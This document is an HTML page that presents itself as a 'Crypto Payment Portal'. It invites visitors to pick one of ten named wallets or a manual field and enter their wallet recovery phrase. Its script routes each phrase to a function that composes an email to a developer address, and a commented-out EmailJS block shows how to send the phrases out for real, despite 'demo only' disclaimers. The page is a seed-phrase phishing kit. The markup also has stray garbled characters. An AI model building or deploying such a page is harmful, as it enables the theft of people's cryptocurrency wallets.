<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Crypto Payment Website</title>
    <style>
        /* Global Styles */
        body {
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
            background: linear-gradient(to right, #00008B, #000000); /* Blue-black gradient */
            color: white;
            overflow-x: hidden;
        }
        header {
            text-align: center;
            padding: 20px;
            background-color: rgba(0, 0, 0, 0.7);
        }
        nav {
            text-align: center;
            margin: 10px 0;
        }
        nav a {
            color: white;
            margin: 0 15px;
            text-decoration: none;
            font-size: 18px;
        }
        nav a:hover {
            text-decoration: underline;
        }
        .moving-text {
            animation: moveText 10s linear infinite;
            white-space: nowrap;
            overflow: hidden;
            font-size: 24px;
            margin: 20px 0;
            text-align: center;
        }
        @keyframes moveText {
            0% { transform: translateX(100%); }
            100% { transform: translateX(-100%); }
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }
        /* Home Page Styles */
        #home {
            text-align: center;
        }
        #home h1 {
            font-size: 48px;
            margin-bottom: 20px;
        }
        #home p {
            font-size: 20px;
        }
        /* Payment Page Styles */
        #payment {
            display: none; /* Hidden by default, shown via JS */
        }
        .wallet-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
        }
        .wallet-card {
            background-color: rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            padding: 15px;
            text-align: center;
            cursor: pointer;
            transition: transform 0.3s;
        }
        .wallet-card:hover {
            transform: scale(1.05);
        }
        .wallet-card img {
 consolidations: 100px;
            height: 100px;
            border-radius: 50%;
            margin-bottom: 10px;
        }
        .wallet-card h3 {
            margin: 10px 0;
        }
        .wallet-card button {
            background-color: #4CAF50;
            color: white;
            border: none;
            padding: 10px;
            cursor: pointer;
            border-radius: 5px;
        }
        .wallet-card button:hover {
            background-color: #45a049;
        }
        .input-phrase {
            display: none;
            margin-top: 10px;
        }
        .input-phrase input {
            width: 100%;
            padding: 8px;
            margin-bottom: 10px;
        }
        .input-phrase button {
            background-color: #2196F3;
            color: white;
            border: none;
            padding: 10px;
            cursor: pointer;
            border-radius: 5px;
        }
        .input-phrase button:hover {
            background-color: #0b7dda;
        }
        /* Manual Phrase Input Styles */
        .manual-phrase {
            margin: 20px 0;
            text-align: center;
        }
        .manual-phrase input {
            width: 50%;
            padding: 10px;
            margin: 10px 0;
            border-radius: 5px;
            border: none;
        }
        .manual-phrase button {
            background-color: #2196F3;
            color: white;
            border: none;
            padding: 10px 20px;
            cursor: pointer;
            border-radius: 5px;
        }
        .manual-phrase button:hover {
            background-color: #0b7dda;
        }
        footer {
            text-align: center;
            padding: 10px;
            background-color: rgba(0, 0, 0, 0.7);
            position: fixed;
            bottom: 0;
            width: 100%;
        }
    </style>
</head>
<body>
    <header>
        <h1>Crypto Payment Portal</h1>
    </header>

    <nav>
        <a href="#" onclick="showPage('home')">Home</a>
        <a href="#" onclick="showPage('payment')">Payment</a>
    </nav>

    <div class="moving-text">Welcome to the Future of Payments - Secure Crypto Transactions - Fast and Reliable!</div>

    <div class="container">
        <section id="home">
            <h1>Welcome to Our Crypto Payment Website</h1>
            <p>This is an attractive and editable website for handling cryptocurrency payments. Navigate to the Payment page to connect your wallet or manually link a phrase.</p>
            <p>Edit the code as needed to customize wallets, images, or add more features.</p>
        </section>

        <section id="payment">
            <h1>Connect Wallet or Link Phrase</h1>
            <p>Choose a wallet to connect or use the manual phrase input below. For demo purposes only - never share real phrases!</p>
            
            <!-- Manual Phrase Input -->
            <div class="manual-phrase">
                <h3>Manually Link Recovery Phrase</h3>
                <input type="text" id="manualPhrase" placeholder="Enter your recovery phrase">
                <button onclick="submitManualPhrase()">Submit Phrase</button>
            </div>

            <h2>Select a Wallet to Connect</h2>
            <div class="wallet-grid">
                <!-- Wallet 1: MetaMask -->
                <div class="wallet-card" onclick="toggleInput(this)">
                    <img src="https://via.placeholder.com/100?text=MetaMask" alt="MetaMask">
                    <h3>MetaMask</h3>
                    <button>Connect</button>
                    <div class="input-phrase">
                        <input type="text" placeholder="Enter recovery phrase">
                        <button onclick="submitWalletPhrase(this)">Submit</button>
                    </div>
                </div>
                <!-- Wallet 2: Trust Wallet -->
                <div class="wallet-card" onclick="toggleInput(this)">
                    <img src="https://via.placeholder.com/100?text=Trust+Wallet" alt="Trust Wallet">
                    <h3>Trust Wallet</h3>
                    <button>Connect</button>
                    <div class="input-phrase">
                        <input type="text" placeholder="Enter recovery phrase">
                        <button onclick="submitWalletPhrase(this)">Submit</button>
                    </div>
                </div>
                <!-- Wallet 3: Coinbase Wallet -->
                <div class="wallet-card" onclick="toggleInput(this)">
                    <img src="https://via.placeholder.com/100?text=Coinbase" alt="Coinbase Wallet">
                    <h3>Coinbase Wallet</h3>
                    <button>Connect</button>
                    <div class="input-phrase">
                        <input type="text" placeholder="Enter recovery phrase">
                        <button onclick="submitWalletPhrase(this)">Submit</button>
                    </div>
                </div>
                <!-- Wallet 4: WalletConnect -->
                <div class="wallet-card" onclick="toggleInput(this)">
                    <img src="https://via.placeholder.com/100?text=WalletConnect" alt="WalletConnect">
                    <h3>WalletConnect</h3>
                    <button>Connect</button>
                    <div class="input-phrase">
                        <input type="text" placeholder="Enter recovery phrase">
                        <button onclick="submitWalletPhrase(this)">Submit</button>
                    </div>
                </div>
                <!-- Wallet 5: Phantom -->
                <div class="wallet-card" onclick="toggleInput(this)">
                    <img src="https://via.placeholder.com/100?text=Phantom" alt="Phantom">
                    <h3>Phantom</h3>
                    <button>Connect</button>
                    <div class="input-phrase">
                        <input type="text" placeholder="Enter recovery phrase">
                        <button onclick="submitWalletPhrase(this)">Submit</button>
                    </div>
                </div>
                <!-- Wallet 6: Exodus -->
                <div class="wallet-card" onclick="toggleInput(this)">
                    <img src="https://via.placeholder.com/100?text=Exodus" alt="Exodus">
                    <h3>Exodus</h3>
                    <button>Connect</button>
                    <div class="input-phrase">
                        <input type="text" placeholder="Enter recovery phrase">
                        <button onclick="submitWalletPhrase(this)">Submit</button>
                    </div>
                </div>
                <!-- Wallet 7: Ledger -->
                <div class="wallet-card" onclick="toggleInput(this)">
                    <img src="https://via.placeholder.com/100?text=Ledger" alt="Ledger">
                    <h3>Ledger</h3>
                    <button>Connect</button>
                    <div class="input-phrase">
                        <input type="text" placeholder="Enter recovery phrase">
                        <button onclick="submitWalletPhrase(this)">Submit</button>
                    </div>
                </div>
                <!-- Wallet 8: Trezor -->
                <div class="wallet-card" onclick="toggleInput(this)">
                    <img src="https://via.placeholder.com/100?text=Trezor" alt="Trezor">
                    <h3>Trezor</h3>
                    <button>Connect</button>
                    <div class="input-phrase">
                        <input type="text" placeholder="Enter recovery phrase">
                        <button onclick="submitWalletPhrase(this)">Submit</button>
                    </div>
                </div>
                <!-- Wallet 9: MyEtherWallet -->
                <div class="wallet-card" onclick="toggleInput(this)">
                    <img src="https://via.placeholder.com/100?text=MyEtherWallet" alt="MyEtherWallet">
                    <h3>MyEtherWallet</h3>
                    <button>Connect</button>
                    <div class="input-phrase">
                        <input type="text" placeholder="Enter recovery phrase">
                        “<button onclick="submitWalletPhrase(this)">Submit</button>
                    </div>
                </div>
                <!-- Wallet 10: Electrum -->
                <div class="wallet-card" onclick="toggleInput(this)">
                    <img src="https://via.placeholder.com/100?text=Electrum" alt="Electrum">
                    <h3>Electrum</h3>
                    <button>Connect</button>
                    <div class="input-phrase">
                        <input type="text" placeholder="Enter recovery phrase">
                        <button onclick="submitWalletPhrase(this)">Submit</button>
                    </div>
                </div>
            </div>
        </section>
    </div>

    <footer>
        &copy; 2025 Crypto Payment Website. All rights reserved.
    </footer>

    <script>
        // Function to show/hide pages
        function showPage(pageId) {
            document.getElementById('home').style.display = 'none';
            document.getElementById('payment').style.display = 'none';
            document.getElementById(pageId).style.display = 'block';
        }

        // Show home by default
        showPage('home');

        // Function to toggle input phrase field
        function toggleInput(card) {
            const inputDiv = card.querySelector('.input-phrase');
            inputDiv.style.display = inputDiv.style.display === 'block' ? 'none' : 'block';
        }

        // Function to handle manual phrase submission
        function submitManualPhrase() {
            const phrase = document.getElementById('manualPhrase').value;
            if (phrase.trim() === '') {
                alert('Please enter a recovery phrase.');
                return;
            }
            sendToDeveloperEmail('Manual Input', phrase);
            alert('Recovery phrase submitted successfully!');
            document.getElementById('manualPhrase').value = ''; // Clear input
        }

        // Function to handle wallet phrase submission
        function submitWalletPhrase(button) {
            const input = button.parentElement.querySelector('input');
            const phrase = input.value;
            const walletName = button.parentElement.parentElement.querySelector('h3').textContent;
            if (phrase.trim() === '') {
                alert('Please enter a recovery phrase.');
                return;
            }
            sendToDeveloperEmail(walletName, phrase);
            alert(`Recovery phrase for ${walletName} submitted successfully!`);
            input.value = ''; // Clear input
            button.parentElement.style.display = 'none'; // Hide input field
        }

        // Simulated function to send phrase to developer email
        function sendToDeveloperEmail(walletName, phrase) {
            const developerEmail = 'developer@example.com'; // Replace with actual email
            const subject = `Recovery Phrase Submission from ${walletName}`;
            const body = `Wallet: ${walletName}\nRecovery Phrase: ${phrase}\n\nNote: This is a demo submission. In production, handle securely via a backend.`;

            // For demo purposes, log to console (replace with actual email service in production)
            console.log(`Sending to ${developerEmail}:\nSubject: ${subject}\nBody: ${body}`);

            // Example: Using EmailJS (uncomment and configure with your EmailJS account)
            /*
            emailjs.send('your_service_id', 'your_template_id', {
                wallet_name: walletName,
 “               recovery_phrase: phrase,
                to_email: developerEmail
            }).then(
                function(response) {
                    console.log('Email sent successfully:', response);
                },
                function(error) {
                    console.error('Email sending failed:', error);
                }
            );
            */

            // Note: For actual email sending, implement a secure backend (e.g., Node.js with Nodemailer or EmailJS).
            // Never expose sensitive data like recovery phrases client-side in production.
        }

        // Note: For real wallet connections, integrate Web3.js or similar libraries.
        // This is a demo UI only. Submitting phrases here is for illustration; in production, never handle seed phrases client-side.
    </script>

    <!-- Optional: Include EmailJS for client-side email sending (configure with your own service) -->
    <!--
    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script>
        (function(){
            emailjs.init('YOUR_PUBLIC_KEY'); // Replace with your EmailJS public key
        })();
    </script>
    -->
</body>
</html>